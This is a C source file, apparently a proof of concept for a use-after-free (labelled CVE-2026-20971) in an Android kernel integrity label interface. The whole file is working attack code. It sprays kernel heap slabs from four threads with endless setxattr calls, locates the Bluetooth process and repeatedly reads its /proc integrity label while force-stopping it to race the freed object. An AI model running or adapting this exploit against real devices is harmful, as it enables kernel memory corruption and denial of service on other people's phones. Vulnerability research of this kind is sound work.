#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <string.h>
#include <signal.h>
#include <dirent.h>
#include <sys/xattr.h>
#include <pthread.h>
#include <sys/wait.h>

int find_pid(const char *name) {
    DIR *dir = opendir("/proc");
    struct dirent *entry;
    int pid = -1;
    if (!dir) return -1;
    
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_DIR) {
            int id = atoi(entry->d_name);
            if (id > 0) {
                char path[256], cmdline[256];
                snprintf(path, sizeof(path), "/proc/%d/cmdline", id);
                int fd = open(path, O_RDONLY);
                if (fd >= 0) {
                    int n = read(fd, cmdline, sizeof(cmdline)-1);
                    close(fd);
                    if (n > 0) {
                        cmdline[n] = '\0';
                        // Используем strstr, так как cmdline может содержать аргументы
                        if (strstr(cmdline, name) != NULL) {
                            pid = id;
                            break;
                        }
                    }
                }
            }
        }
    }
    closedir(dir);
    return pid;
}

void* spray_thread(void* arg) {
    char value[64];
    memset(value, 0xFF, sizeof(value)); 
    char path[64];
    snprintf(path, sizeof(path), "/data/local/tmp/spray_%d", gettid());
    int fd = open(path, O_CREAT | O_RDWR, 0600);
    if (fd >= 0) close(fd);

    long count = 0;
    while(1) {
        char name[64];
        snprintf(name, sizeof(name), "user.spray_%ld", count++);
        // Если память кончится, просто продолжаем
        setxattr(path, name, value, sizeof(value), 0);
    }
    return NULL;
}

int main() {
    setbuf(stdout, NULL);
    printf("[*] CVE-2026-20971 FIVE Label UAF PoC v6\n");

    // Запускаем потоки спрея (kmalloc-32, 64)
    for (int i=0; i<4; i++) {
        pthread_t tid;
        pthread_create(&tid, NULL, spray_thread, NULL);
        pthread_detach(tid);
    }

    char *buf = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    long iterations = 0;
    int last_pid = -1;

    while (1) {
        int pid = find_pid("com.android.bluetooth");
        if (pid == -1) {
            // Выводим только если PID изменился (чтобы не спамить)
            if (last_pid != -1) {
                printf("[-] Bluetooth not found. Waiting...\n");
                last_pid = -1;
            }
            usleep(100000); // 100ms
            continue;
        }

        if (pid != last_pid) {
            printf("[+] Found Bluetooth PID: %d\n", pid);
            last_pid = pid;
        }

        char path[64];
        snprintf(path, sizeof(path), "/proc/%d/integrity/label", pid);

        madvise(buf, 4096, MADV_DONTNEED);
        int fd = open(path, O_RDONLY);
        if (fd >= 0) {
            read(fd, buf, 4096); 
            close(fd);
        }

        // Вместо kill используем am force-stop (работает через system_server)
        // Это гарантированно убьет процесс, если у нас есть права shell.
        system("am force-stop com.android.bluetooth");
        
        iterations++;
        if (iterations % 1000 == 0) {
            printf("[*] Iterations: %ld\n", iterations);
        }
    }
    return 0;
}